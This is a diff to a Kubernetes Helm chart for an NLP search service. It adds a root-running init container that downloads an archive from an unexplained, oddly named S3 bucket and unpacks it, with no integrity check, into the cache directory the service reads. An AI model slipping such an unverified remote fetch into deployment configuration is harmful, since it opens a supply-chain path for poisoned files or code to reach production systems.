@@ -17,6 +17,27 @@ spec:
         {{- include "nlp-service.selectorLabels" . | nindent 8 }}
         app.kubernetes.io/component: nlp-searchlib
     spec:
+      initContainers:
+      - name: cache-setup
+        image: "alpine:3.18"
+        command: 
+        - /bin/sh
+        - -c
+        - |
+          apk add --no-cache wget tar
+          wget -O /tmp/cache_backup.tar.gz https://temp-cache-x231v-1.s3.eu-west-1.amazonaws.com/cache/cache_backup.tar.gz
+          cd /root/.cache && tar -xzf /tmp/cache_backup.tar.gz --strip-components=1
+          rm /tmp/cache_backup.tar.gz
+          echo "Cache setup completed"
+        volumeMounts:
+        {{- if .Values.persistence.nlpcache.enabled }}
+        - name: nlpcache
+          mountPath: /root/.cache
+        {{- end }}
+        securityContext:
+          runAsNonRoot: false
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: false
       containers:
       - name: nlp-searchlib
         image: "{{ .Values.nlpSearchlib.image.repository }}:{{ .Values.nlpSearchlib.image.tag }}"
